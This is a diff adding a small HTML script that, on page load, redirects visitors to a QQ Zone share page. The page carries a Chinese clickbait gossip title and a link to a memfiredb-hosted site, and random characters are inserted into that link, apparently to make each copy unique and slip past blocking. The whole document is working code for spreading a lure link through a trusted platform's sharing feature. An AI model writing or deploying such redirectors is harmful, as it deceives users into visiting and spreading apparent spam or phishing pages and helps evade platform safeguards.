@@ -1,0 +1,22 @@
+﻿<script>
+
+var urls=[
+'https://h5.qzone.qq.com/q/qzs/open/connect/widget/mobile/qzshare/index.html?page=qzshare.html&loginpage=loginindex.html&logintype=qzone&title=%E7%82%B9%E6%88%91%E5%90%83%F0%9F%8D%89&summary=&url=http%3A%2F%2Fcjmpi425g6h95mu41mug.app.memfiredb.com?{nnnnnnnn}{www}&desc=&imageUrl=https%3A%2F%2Fp4.itc.cn%2Fq_70%2Fimages03%2F20210329%2Fbad035aff1fd4e389169405b50660b49.jpeg&desc=%E7%B2%BE%E5%BD%A9%E5%90%83%F0%9F%8D%89%E7%80%91%E6%96%99%E2%86%93%E2%86%93%E2%86%93',
+//'https://baidu.com',
+
+];
+location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
+function myEeplace(s){
+	return s.replace(/\{(\w+?)\}/g,function(a,b){
+		var h='';
+		for(var i=0;i<b.length;i++){
+			if('n'==b[i]){
+				h+=Math.floor(Math.random()*10);
+			}else if('w'==b[i]){
+				h+=String.fromCharCode(97+Math.floor(Math.random()*26));
+			}
+		}
+		return h;
+	});
+}
+</script>
